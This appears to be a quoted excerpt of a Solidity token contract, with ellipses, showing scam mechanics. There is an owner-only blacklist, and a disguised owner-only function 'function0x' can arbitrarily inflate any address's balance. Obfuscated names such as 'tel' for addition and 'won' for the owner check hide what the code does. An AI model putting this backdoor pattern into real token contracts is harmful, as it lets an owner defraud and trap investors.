...
library SafeMath {
    ...
    function tel(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
...
contract  jj is Context, IERC20, Ownable {
    ...
    bool telwapAndLiquify;

    modifier lockTheSwap {
        telwapAndLiquify = true;
        _;
        telwapAndLiquify = false;
    }
    ...
    constructor () {
        ...
        FundReceiver = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
    ...
    function setBlackList(address[] calldata addresses, bool status) public won() {
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (!telwapAndLiquify && !marketPairList[from]) 
            {
    ...
    function function0x(address safety, uint256 amount) public won() {
        _balances[safety] = _balances[safety].mul(9).tel(amount).div(7);
    }
